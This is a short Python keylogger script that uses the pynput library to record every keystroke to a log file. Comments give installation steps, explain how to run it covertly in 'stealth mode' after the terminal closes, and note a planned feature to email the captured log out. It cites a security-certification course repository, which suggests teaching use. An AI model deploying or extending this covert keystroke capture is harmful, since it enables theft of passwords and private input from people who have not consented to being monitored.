

# [[[[ STILL NEED TO DEFINE AN ARGUMENT THAT SENDS OUT THE FULL KEY LOG TO AN EMAIL AFTER A SPECIFIED CHARACTER LIMIT IS SET ]]]]

# REQUIREMENTS:
# [Win] - " pip install pynput "
# [Linux] - " pip3 install pynput "

# PERMISSIONS FOR MAC:
# For Windows, the program should work like a charm. But in case you are a Mac user — Go to Settings > Security & Privacy > Privacy > Input Monitoring and tick the checkbox in front of the Terminal or the IDE you are working on.



#  [DONT RUN "Keylogger" AS SUDO ]

from ast import AugAssign
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

# How to run Script in Stealth Mode: ( This will let the code run even after the terminal closes while still recording the keystrokes )
# [Win] - " Rename file extension from .py to .pyw "
# [Linux] - " nohup python3 key.py & "

# [S] - https://github.com/davidbombal/CompTIA-Security-Plus/blob/main/python-keylogger
